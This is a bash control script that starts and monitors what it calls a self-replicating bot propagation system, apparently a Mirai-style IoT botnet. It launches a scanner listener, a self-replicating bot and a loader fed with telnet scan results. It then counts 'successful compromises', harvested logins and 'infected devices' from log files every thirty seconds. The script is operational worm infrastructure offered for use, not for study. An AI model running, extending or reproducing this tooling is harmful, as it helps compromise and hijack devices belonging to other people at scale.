#!/bin/bash

# Complete Self-Replication System Startup
# This script starts the entire bot propagation system

echo "🚀 Starting Complete Self-Replication System"
echo "============================================="

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Function to check if process is running
check_process() {
    if ps -p $1 > /dev/null 2>&1; then
        echo -e "${GREEN}✅ $2 running (PID: $1)${NC}"
        return 0
    else
        echo -e "${RED}❌ $2 not running${NC}"
        return 1
    fi
}

# Function to cleanup on exit
cleanup() {
    echo ""
    echo "🛑 Stopping all processes..."
    kill $SCANLISTEN_PID $BOT_PID $LOADER_PID 2>/dev/null
    echo "✅ All processes stopped"
    exit 0
}

trap cleanup SIGINT SIGTERM

echo ""
echo "1. Starting scanListen..."
cd /root
./scanListen > /root/logs/scanlisten.log 2>&1 &
SCANLISTEN_PID=$!
sleep 2
check_process $SCANLISTEN_PID "scanListen"

echo ""
echo "2. Starting Self-Rep Bot..."
cd /root/bot
./start_selfrep_debug.sh &
BOT_PID=$!
sleep 3
check_process $BOT_PID "Self-Rep Bot"

echo ""
echo "3. Starting Loader..."
cd /root/loader
python loader.py /root/tel_listen.txt &
LOADER_PID=$!
sleep 2
check_process $LOADER_PID "Loader"

echo ""
echo "4. System Status:"
echo "=================="
echo "scanListen PID: $SCANLISTEN_PID"
echo "Bot PID: $BOT_PID" 
echo "Loader PID: $LOADER_PID"
echo ""

echo "📊 Monitoring Files:"
echo "===================="
echo "Scanner Log: /tmp/selfrep_debug.log"
echo "Scan Results: /root/tel_listen.txt"
echo "Successful Logins: /root/loader/bots.txt"
echo "Infected Devices: /root/loader/infected.txt"
echo "Echo-loaded Devices: /root/loader/echoes.txt"
echo ""

echo "🔍 Real-time Monitoring Commands:"
echo "=================================="
echo "Monitor scanner: tail -f /tmp/selfrep_debug.log"
echo "Monitor scan results: tail -f /root/tel_listen.txt"
echo "Monitor successful logins: tail -f /root/loader/bots.txt"
echo "Monitor infections: tail -f /root/loader/infected.txt"
echo ""

echo "Press Ctrl+C to stop all processes"
echo ""

# Monitor the system
while true; do
    sleep 30
    echo "=== System Status ==="
    
    # Check scanListen
    if check_process $SCANLISTEN_PID "scanListen"; then
        # Count entries in tel_listen.txt
        if [ -f "/root/tel_listen.txt" ]; then
            COUNT=$(wc -l < /root/tel_listen.txt 2>/dev/null || echo "0")
            echo "   Scan results: $COUNT entries"
        fi
    fi
    
    # Check bot
    if check_process $BOT_PID "Self-Rep Bot"; then
        # Count scanner activities
        if [ -f "/tmp/selfrep_debug.log" ]; then
            SCANNER_COUNT=$(grep -c "SCANNER" /tmp/selfrep_debug.log 2>/dev/null || echo "0")
            COMPROMISE_COUNT=$(grep -c "successful compromise" /tmp/selfrep_debug.log 2>/dev/null || echo "0")
            echo "   Scanner activities: $SCANNER_COUNT"
            echo "   Successful compromises: $COMPROMISE_COUNT"
        fi
    fi
    
    # Check loader
    if check_process $LOADER_PID "Loader"; then
        # Count loader results
        if [ -f "/root/loader/bots.txt" ]; then
            BOTS_COUNT=$(wc -l < /root/loader/bots.txt 2>/dev/null || echo "0")
            echo "   Successful logins: $BOTS_COUNT"
        fi
        
        if [ -f "/root/loader/infected.txt" ]; then
            INFECTED_COUNT=$(wc -l < /root/loader/infected.txt 2>/dev/null || echo "0")
            echo "   Infected devices: $INFECTED_COUNT"
        fi
    fi
    
    echo "===================="
done
